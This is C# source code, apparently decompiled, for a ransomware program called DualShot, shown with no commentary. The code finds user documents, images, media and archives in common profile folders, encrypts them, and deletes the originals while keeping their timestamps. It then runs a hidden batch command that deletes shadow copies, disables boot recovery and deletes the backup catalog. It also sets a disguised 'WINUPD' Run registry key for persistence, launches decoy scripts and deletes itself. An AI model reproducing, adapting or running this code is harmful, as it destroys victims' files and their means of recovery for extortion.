using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DualShot.Properties;
using Microsoft.Win32;

namespace DualShot;

internal static class Program
{
	private static void EncryptFile(string fpath, byte[] pbkey)
	{
		DateTime creationTime = File.GetCreationTime(fpath);
		DateTime lastAccessTime = File.GetLastAccessTime(fpath);
		DateTime lastWriteTime = File.GetLastWriteTime(fpath);
		byte[] array = DSEncryption.Encrypt(File.ReadAllBytes(fpath), pbkey);
		FileStream fileStream = File.Create(fpath + ".dsec");
		fileStream.Write(array, 0, array.Length);
		fileStream.Close();
		File.SetCreationTime(fpath + ".dsec", creationTime);
		File.SetLastAccessTime(fpath + ".dsec", lastAccessTime);
		File.SetLastWriteTime(fpath + ".dsec", lastWriteTime);
		try
		{
			File.Open(fpath, FileMode.Truncate, FileAccess.ReadWrite).Close();
		}
		catch (Exception)
		{
		}
		try
		{
			File.Delete(fpath);
		}
		catch (Exception)
		{
		}
	}

	private static void DecryptFile(string fpath, byte[] pvkey)
	{
		DateTime creationTime = File.GetCreationTime(fpath);
		DateTime lastAccessTime = File.GetLastAccessTime(fpath);
		DateTime lastWriteTime = File.GetLastWriteTime(fpath);
		byte[] array = DSEncryption.Decrypt(File.ReadAllBytes(fpath), pvkey);
		FileStream fileStream = File.Create(fpath.Substring(0, fpath.Length - 5));
		fileStream.Write(array, 0, array.Length);
		fileStream.Close();
		File.SetCreationTime(fpath.Substring(0, fpath.Length - 5), creationTime);
		File.SetLastAccessTime(fpath.Substring(0, fpath.Length - 5), lastAccessTime);
		File.SetLastWriteTime(fpath.Substring(0, fpath.Length - 5), lastWriteTime);
		try
		{
			File.Delete(fpath);
		}
		catch (Exception)
		{
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("RebootAfterEnc", "0");
		dictionary.Add("DeleteShadowCopies", "1");
		if (File.Exists("C:\\Users\\Lenovo\\Desktop\\AntiOwnVirus.txt") || Directory.Exists("C:\\Users\\Lenovo\\Desktop\\WiringIcons"))
		{
			Process.GetCurrentProcess().Kill();
		}
		Random random = new Random();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		string value;
		if (args.Length != 0)
		{
			if (args[0] == "/inin")
			{
				bool flag = false;
				if (args.Length > 1 && args[1] == "/nores")
				{
					flag = true;
				}
				Thread.Sleep(5000);
				Tuple<byte[], byte[]> tuple = DSEncryption.GenerateKeys(15, 5);
				byte[] item = tuple.Item1;
				byte[] item2 = tuple.Item2;
				string text = Path.GetTempPath() + "TMP10" + random.Next(10000, 99999) + ".dat";
				FileStream fileStream = File.Create(text);
				fileStream.Write(item2, 0, item2.Length);
				fileStream.Close();
				string[] array = new string[0];
				string[] array2 = new string[6] { "Desktop", "Documents", "Music", "Video", "Photos", "Downloads" };
				string[] array3 = new string[53]
				{
					"png", "jpg", "jpeg", "bmp", "tif", "tiff", "txt", "ogg", "wav", "mp3",
					"mp4", "pdn", "zip", "7z", "7zip", "tar.gz", "doc", "dot", "wbk", "docx",
					"docm", "dotx", "dotm", "docb", "xls", "xlt", "xlm", "xlsx", "xlsm", "xltx",
					"xltm", "xlsb", "xla", "xlam", "xll", "xlw", "xml", "ppt", "pot", "pps",
					"pptx", "pptm", "potx", "potm", "ppam", "ppsx", "ppsm", "sldx", "sldm", "pub",
					"xps", "rtf", "jnt"
				};
				string text2 = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).FullName;
				if (Environment.OSVersion.Version.Major >= 6)
				{
					text2 = Directory.GetParent(text2).ToString();
				}
				string[] array4 = array2;
				foreach (string text3 in array4)
				{
					try
					{
						string[] files = Directory.GetFiles(text2 + "\\" + text3, "*.*", SearchOption.AllDirectories);
						foreach (string text4 in files)
						{
							try
							{
								string[] array5 = array3;
								foreach (string text5 in array5)
								{
									if (text4.EndsWith("." + text5))
									{
										Array.Resize(ref array, array.Length + 1);
										array[array.GetUpperBound(0)] = text4;
										break;
									}
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
				array4 = array;
				foreach (string fpath in array4)
				{
					try
					{
						EncryptFile(fpath, item);
					}
					catch (Exception)
					{
					}
				}
				string s = string.Join("\n", array);
				string text6 = Path.GetTempPath() + "TMP" + random.Next(10000, 99999) + ".dat";
				FileStream fileStream2 = File.Create(text6);
				fileStream2.Write(Encoding.ASCII.GetBytes(s), 0, Encoding.ASCII.GetBytes(s).Length);
				fileStream2.Close();
				dictionary.TryGetValue("DeleteShadowCopies", out value);
				if (value == "1")
				{
					string text7 = Path.GetTempPath() + "tmp" + random.Next(100, 999) + "0042.bat";
					FileStream fileStream3 = File.Create(text7);
					File.WriteAllText(text7, "vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet");
					fileStream3.Close();
					Process.Start(new ProcessStartInfo
					{
						RedirectStandardOutput = true,
						UseShellExecute = false,
						CreateNoWindow = true,
						FileName = "cmd",
						Arguments = "/c " + text7,
						Verb = "runas"
					});
				}
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "WINUPD" + random.Next(10000, 99999), Assembly.GetExecutingAssembly().Location + " /ainain " + text6 + " " + text);
				if (flag)
				{
					Process.Start(new ProcessStartInfo
					{
						RedirectStandardOutput = true,
						UseShellExecute = false,
						CreateNoWindow = true,
						FileName = "shutdown",
						Arguments = "-r -t 60 -c \"Please restart.\""
					});
				}
				else
				{
					Process.Start(Assembly.GetExecutingAssembly().Location, "/ainain " + text6 + " " + text);
				}
				Process.GetCurrentProcess().Kill();
			}
			else
			{
				if (!(args[0] == "/ainain"))
				{
					return;
				}
				string[] fileslist = File.ReadAllLines(args[1]);
				if (File.Exists(args[2]))
				{
					byte[] inArray = File.ReadAllBytes(args[2]);
					Settings.Default.privkeyenc = Convert.ToBase64String(inArray);
					try
					{
						File.Open(args[2], FileMode.Truncate, FileAccess.ReadWrite).Close();
					}
					catch (Exception)
					{
					}
					File.Delete(args[2]);
				}
				Application.Run((Form)(object)new MainWindow(fileslist, Convert.FromBase64String(Settings.Default.privkeyenc)));
			}
			return;
		}
		string text8 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DSNWIN" + random.Next(1000, 9999) + ".exe";
		File.Copy(Assembly.GetExecutingAssembly().Location, text8);
		dictionary.TryGetValue("RebootAfterEnc", out value);
		if (value == "0")
		{
			Process.Start(text8, "/inin /nores");
		}
		else
		{
			Process.Start(text8, "/inin");
		}
		string[] array6 = new string[2] { "vbs", "bat" };
		for (int l = 0; l < 25; l++)
		{
			try
			{
				string text9 = Path.GetTempPath() + "tds" + random.Next(100000, 999999) + "." + array6[random.Next(array6.Length)];
				File.Create(text9).Close();
				Process.Start(new ProcessStartInfo
				{
					FileName = text9,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				});
			}
			catch (Exception)
			{
			}
		}
		Process.Start(new ProcessStartInfo
		{
			RedirectStandardOutput = true,
			UseShellExecute = false,
			CreateNoWindow = true,
			FileName = "cmd",
			Arguments = "/c choice /c Y /n /d Y /t 3 & del \"" + Assembly.GetExecutingAssembly().Location + "\""
		});
		Process.GetCurrentProcess().Kill();
	}
}
